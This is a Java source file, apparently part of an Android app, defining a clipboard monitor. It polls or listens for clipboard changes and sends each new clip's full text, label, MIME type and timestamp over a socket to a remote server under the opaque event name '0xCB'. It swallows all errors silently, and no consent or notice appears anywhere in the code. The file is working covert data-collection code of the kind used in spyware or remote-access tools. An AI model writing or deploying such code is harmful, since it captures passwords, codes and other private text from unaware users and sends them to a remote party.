package com.fason.app.features.clipboard;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;

import com.fason.app.core.network.SocketClient;

import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

// Clipboard monitor
public final class ClipboardMonitor {

    private static final long POLL_INTERVAL = 3000;
    private static final long MIN_EMIT = 1000;

    private static ClipboardMonitor instance;
    private final Context ctx;
    private final Handler handler;
    private final ExecutorService exec;

    private ClipboardManager mgr;
    private ClipboardManager.OnPrimaryClipChangedListener listener;
    private final AtomicBoolean running = new AtomicBoolean(false);
    private final AtomicBoolean polling = new AtomicBoolean(false);

    private String lastText;
    private long lastEmit = 0;

    private final Runnable pollTask = new Runnable() {
        @Override
        public void run() {
            if (!running.get()) return;
            poll();
            if (polling.get()) {
                handler.postDelayed(this, POLL_INTERVAL);
            }
        }
    };

    private ClipboardMonitor(Context context) {
        this.ctx = context.getApplicationContext();
        this.handler = new Handler(Looper.getMainLooper());
        this.exec = Executors.newSingleThreadExecutor();
    }

    // Get singleton instance
    public static synchronized ClipboardMonitor getInstance(Context context) {
        if (instance == null) {
            instance = new ClipboardMonitor(context);
        }
        return instance;
    }

    // Start monitoring
    public synchronized void start() {
        if (running.getAndSet(true)) return;

        if (mgr == null) {
            mgr = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        }

        if (mgr == null) {
            running.set(false);
            return;
        }

        // Android 10+ uses polling due to background restrictions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            polling.set(true);
            handler.post(pollTask);
        } else {
            startListener();
        }

        exec.execute(() -> emit(true));
    }

    // Start listener
    private void startListener() {
        if (mgr == null || listener != null) return;

        try {
            listener = () -> {
                if (running.get()) {
                    exec.execute(() -> emit(false));
                }
            };
            mgr.addPrimaryClipChangedListener(listener);
            polling.set(false);
        } catch (Exception e) {
            polling.set(true);
            handler.post(pollTask);
        }
    }

    // Stop monitoring
    public synchronized void stop() {
        if (!running.getAndSet(false)) return;

        handler.removeCallbacks(pollTask);

        if (mgr != null && listener != null) {
            try {
                mgr.removePrimaryClipChangedListener(listener);
            } catch (Exception ignored) {}
        }

        listener = null;
        lastText = null;
        polling.set(false);
    }

    // Emit clipboard snapshot
    public void emit() {
        emit(true);
    }

    // Legacy method
    public void emitClipboardSnapshot() {
        emit(true);
    }

    // Poll clipboard
    private void poll() {
        if (mgr == null) {
            mgr = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        }
        if (mgr == null) return;

        try {
            if (mgr.hasPrimaryClip()) {
                emit(false);
            }
        } catch (Exception ignored) {}
    }

    // Emit clipboard content
    private void emit(boolean allowDup) {
        if (mgr == null) {
            mgr = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        }
        if (mgr == null) return;

        try {
            if (!mgr.hasPrimaryClip()) return;

            ClipData clip = mgr.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) return;

            CharSequence text = clip.getItemAt(0).getText();
            if (TextUtils.isEmpty(text)) return;

            String s = text.toString();

            // Check duplicate
            if (!allowDup && s.equals(lastText)) return;

            // Rate limit
            long now = System.currentTimeMillis();
            if (!allowDup && (now - lastEmit) < MIN_EMIT) return;

            JSONObject data = new JSONObject();
            data.put("text", s);
            data.put("timestamp", now);
            data.put("length", s.length());

            if (clip.getDescription() != null) {
                data.put("label", clip.getDescription().getLabel());
                data.put("mimeType", clip.getDescription().getMimeType(0));
            }

            SocketClient.getInstance().getSocket().emit("0xCB", data);

            lastText = s;
            lastEmit = now;
        } catch (Exception ignored) {}
    }

    // Check if running
    public boolean isRunning() {
        return running.get();
    }

    // Shutdown
    public void shutdown() {
        stop();
        exec.shutdown();
    }
}
